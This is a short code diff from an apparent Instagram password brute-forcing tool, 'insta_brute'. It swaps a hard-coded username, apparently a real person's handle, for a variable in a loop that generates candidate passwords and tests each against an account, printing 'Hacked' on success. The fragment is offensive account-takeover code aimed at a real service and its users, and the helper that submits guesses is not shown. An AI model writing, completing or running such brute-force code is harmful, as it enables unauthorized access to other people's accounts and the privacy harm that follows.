@@ -16,9 +16,9 @@ def insta_brute(target, pwd_size=8):
     while stack:
         current, depth = stack.pop()
         if depth == pwd_size:
-            username = harishini1512
+            username = username
             password = current
-            if insta_pass(harishini1512, password):
+            if insta_pass(username, password):
                 pass_table = [
                     [typer.style(username, fg=typer.colors.GREEN), typer.style(password, fg=typer.colors.GREEN), typer.style("Hacked. Password is Helper/good.txt", fg=typer.colors.CYAN)]
                 ]
